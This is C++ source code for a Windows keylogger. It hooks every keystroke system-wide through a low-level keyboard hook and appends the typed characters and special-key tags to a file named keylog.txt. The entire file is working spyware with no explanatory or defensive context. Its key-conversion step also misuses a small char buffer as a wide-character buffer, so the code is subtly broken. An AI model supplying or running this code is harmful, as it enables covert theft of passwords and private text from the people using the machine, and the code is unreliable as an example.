#include <windows.h>
#include <iostream>
#include <fstream>

HHOOK hKeyboardHook;
std::ofstream logFile;

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;

        // Handle the special keys
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            char key[2] = {};
            DWORD vkCode = kbs->vkCode;
            UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

            // Converting virtual key code to character
            if (ToUnicode(vkCode, scanCode, NULL, (LPWSTR)key, 2, 0) > 0) {
                logFile << key; // Log the character
            } else {
                // Log the special keys
                switch (vkCode) {
                    case VK_BACK: logFile << "[BACKSPACE]"; break;
                    case VK_TAB: logFile << "[TAB]"; break;
                    case VK_RETURN: logFile << "[ENTER]"; break;
                    case VK_SHIFT: logFile << "[SHIFT]"; break;
                    case VK_CONTROL: logFile << "[CTRL]"; break;
                    case VK_MENU: logFile << "[ALT]"; break;
                    // Add more special key handling if needed
                    default: break;
                }
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

void StartLogging() {
    logFile.open("keylog.txt", std::ios::out | std::ios::app);
    if (logFile.is_open()) {
        hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    }
}

void StopLogging() {
    UnhookWindowsHookEx(hKeyboardHook);
    logFile.close();
}

int main() {
    StartLogging();
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
    StopLogging();
    return 0;
}